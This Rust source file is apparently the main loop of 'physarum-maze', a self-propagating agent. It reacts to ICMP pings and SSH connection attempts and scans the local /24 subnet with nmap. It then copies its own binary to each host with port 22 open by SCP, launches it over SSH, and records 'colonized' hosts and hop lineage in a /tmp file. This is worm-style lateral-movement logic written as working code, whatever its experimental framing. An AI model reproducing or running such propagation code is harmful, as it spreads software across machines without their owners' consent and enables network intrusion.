/// Main agent event loop — PF-2 edition.
///
/// Stimulus sources (all feed the same candidate pipeline):
///   1. Raw ICMP socket: incoming echo requests (higher layers ping lower layers)
///   2. Raw TCP SYN socket: incoming SYN to port 22 (X→A.1 stimulus in PF-2)
///   3. Periodic /24 nmap discovery: finds new hosts in the local subnet (A→A.1)
///
/// Per-candidate decision chain:
///   1. Skip if already in lineage path (cycle guard)
///   2. Skip if known dead end
///   3. Skip if already marked colonized this session
///   4. Skip if already attempted this session
///   5. TCP-22 probe: confirm SSH is listening
///   6. Colonization check: if target already runs physarum-maze → secondary conduit
///   7. Targeted nmap -sV scan (informational, non-blocking)
///   8. SCP push + SSH launch propagated instance
///   9. Update lineage + save /tmp/physarum-lineage.json
use crate::{
    lineage::Lineage,
    propagation::{self, Outcome},
    Cli, Mode,
};
use anyhow::Result;
use std::collections::HashSet;
use std::net::Ipv4Addr;
use std::path::Path;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::time::timeout;

pub async fn run(cli: Cli) -> Result<()> {
    let mut lineage = init_lineage(&cli)?;
    lineage.save()?;

    if lineage.hops >= cli.max_hops {
        tracing::warn!(
            hops = lineage.hops,
            max = cli.max_hops,
            "max hops reached — dormant"
        );
        return Ok(());
    }

    let binary_path = std::env::current_exe()?;
    let local_ip = resolve_local_ip(&cli, &lineage);

    let mut icmp_rx = crate::icmp::start(cli.interface.clone());
    let mut tcp_rx = crate::tcp::start(cli.interface.clone());
    let mut discovery_ticker =
        tokio::time::interval(Duration::from_secs(cli.discovery_interval_secs));
    let mut attempted: HashSet<Ipv4Addr> = HashSet::new();

    // dormant_at is reset on every successful stimulus; when it fires the
    // organism goes dormant.  Using sleep_until lets us reset cheaply each loop.
    let stimulus_timeout = Duration::from_secs(cli.stimulus_timeout_secs);
    let mut dormant_at = tokio::time::Instant::now() + stimulus_timeout;

    tracing::info!(
        mode    = ?cli.mode,
        hops    = lineage.hops,
        origin  = %lineage.origin,
        path    = ?lineage.path,
        local   = ?local_ip.map(|ip| ip.to_string()),
        "physarum-maze agent ready — awaiting stimulus"
    );

    loop {
        tokio::select! {
            // ── ICMP echo-request stimulus ────────────────────────────────
            maybe_ip = icmp_rx.recv() => {
                match maybe_ip {
                    Some(ip) => {
                        dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                        handle_candidate(
                            ip, "icmp", &mut lineage, &binary_path, &mut attempted,
                        ).await?;
                    }
                    None => {
                        tracing::info!("ICMP channel closed — shutting down");
                        break;
                    }
                }
            }

            // ── TCP SYN to port 22 stimulus (PF-2: X → A.1) ──────────────
            maybe_ip = tcp_rx.recv() => {
                match maybe_ip {
                    Some(ip) => {
                        dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                        handle_candidate(
                            ip, "tcp-syn", &mut lineage, &binary_path, &mut attempted,
                        ).await?;
                    }
                    None => {
                        tracing::info!("TCP channel closed — shutting down");
                        break;
                    }
                }
            }

            // ── Periodic /24 nmap discovery ───────────────────────────────
            _ = discovery_ticker.tick() => {
                if let Some(my_ip) = local_ip {
                    let candidates = crate::discovery::scan_local_subnet(my_ip).await;
                    for ip in candidates {
                        handle_candidate(
                            ip, "discovery", &mut lineage, &binary_path, &mut attempted,
                        ).await?;
                    }
                }
            }

            // ── Stimulus timeout ──────────────────────────────────────────
            _ = tokio::time::sleep_until(dormant_at) => {
                tracing::info!(
                    secs = cli.stimulus_timeout_secs,
                    "no stimulus — going dormant"
                );
                break;
            }
        }
    }

    tracing::info!(
        hops              = lineage.hops,
        path              = ?lineage.path,
        scores            = ?lineage.scores,
        secondary_conduits = ?lineage.secondary_conduits,
        "physarum-maze shutting down"
    );
    Ok(())
}

/// Process one candidate IP regardless of which stimulus source produced it.
async fn handle_candidate(
    src_ip: Ipv4Addr,
    stimulus: &str,
    lineage: &mut Lineage,
    binary_path: &Path,
    attempted: &mut HashSet<Ipv4Addr>,
) -> Result<()> {
    let ip_str = src_ip.to_string();

    if lineage.is_visited(&ip_str) {
        tracing::debug!(%src_ip, stimulus, "already in lineage path — loop guard, skip");
        return Ok(());
    }
    if lineage.is_dead_end(&ip_str) {
        tracing::debug!(%src_ip, stimulus, "known dead end — skip");
        return Ok(());
    }
    if lineage.is_colonized(&ip_str) {
        tracing::debug!(%src_ip, stimulus, "already colonized — skip");
        return Ok(());
    }
    if !attempted.insert(src_ip) {
        tracing::debug!(%src_ip, stimulus, "already attempted this session — skip");
        return Ok(());
    }

    tracing::info!(%src_ip, stimulus, "stimulus received — confirming SSH on port 22");

    if !port_22_open(src_ip).await {
        tracing::warn!(%src_ip, "port 22 not open — dead end");
        lineage.mark_dead_end(&ip_str);
        lineage.save()?;
        return Ok(());
    }

    // Targeted scan (informational — does not block propagation decision).
    tokio::spawn(crate::discovery::scan_targeted(src_ip));

    let next_lineage = lineage.extend(&ip_str);
    let next_b64 = next_lineage.to_b64()?;

    tracing::info!(%src_ip, hops = next_lineage.hops, "propagating");

    // propagate() performs the colonization check (step 0) before SCP.
    match propagation::propagate(src_ip, binary_path, &next_b64).await? {
        Outcome::Success => {
            tracing::info!(%src_ip, hops = next_lineage.hops, "propagation success");
            *lineage = next_lineage;
            lineage.save()?;
        }
        Outcome::AlreadyColonized => {
            tracing::info!(%src_ip, "already colonized — recording secondary conduit");
            let from = lineage
                .path
                .last()
                .cloned()
                .unwrap_or_else(|| lineage.origin.clone());
            lineage.mark_colonized(&ip_str);
            lineage.add_secondary_conduit(&from, &ip_str);
            lineage.save()?;
        }
        Outcome::ScpFailed => {
            tracing::warn!(%src_ip, "SCP failed — sshd AllowUsers blocked (dead end)");
            lineage.mark_dead_end(&ip_str);
            lineage.save()?;
        }
        Outcome::SshFailed => {
            tracing::warn!(%src_ip, "SSH launch failed — penalizing edge");
            lineage.penalize(&ip_str);
            lineage.save()?;
        }
    }

    Ok(())
}

fn init_lineage(cli: &Cli) -> Result<Lineage> {
    match &cli.mode {
        Mode::Seed => {
            let my_ip = local_ip(&cli.interface)?;
            tracing::info!(%my_ip, iface = %cli.interface, "seed mode");
            Ok(Lineage::seed(&my_ip.to_string()))
        }
        Mode::Propagated => {
            let b64 = cli
                .lineage_b64
                .as_deref()
                .ok_or_else(|| anyhow::anyhow!("--lineage-b64 required in propagated mode"))?;
            let lin = Lineage::from_b64(b64)?;
            tracing::info!(
                hops   = lin.hops,
                origin = %lin.origin,
                path   = ?lin.path,
                "propagated mode — lineage received"
            );
            Ok(lin)
        }
    }
}

/// Resolve the local IPv4 address used for /24 discovery.
///
/// In seed mode: read from the NIC.
/// In propagated mode: the last IP in the lineage path is the current host.
fn resolve_local_ip(cli: &Cli, lineage: &Lineage) -> Option<Ipv4Addr> {
    match &cli.mode {
        Mode::Seed => local_ip(&cli.interface).ok(),
        Mode::Propagated => lineage.path.last().and_then(|s| s.parse::<Ipv4Addr>().ok()),
    }
}

/// TCP connect probe — confirms port 22 is open and accepting connections.
async fn port_22_open(ip: Ipv4Addr) -> bool {
    match timeout(Duration::from_secs(5), TcpStream::connect((ip, 22u16))).await {
        Ok(Ok(_)) => {
            tracing::debug!(%ip, "port 22 open");
            true
        }
        Ok(Err(e)) => {
            tracing::debug!(%ip, error = %e, "port 22 refused");
            false
        }
        Err(_) => {
            tracing::debug!(%ip, "port 22 timeout");
            false
        }
    }
}

/// Determine the IPv4 address assigned to `interface`.
fn local_ip(interface: &str) -> anyhow::Result<Ipv4Addr> {
    for iface in if_addrs::get_if_addrs()? {
        if iface.name == interface {
            if let if_addrs::IfAddr::V4(v4) = iface.addr {
                return Ok(v4.ip);
            }
        }
    }
    anyhow::bail!("no IPv4 address found for interface '{}'", interface)
}
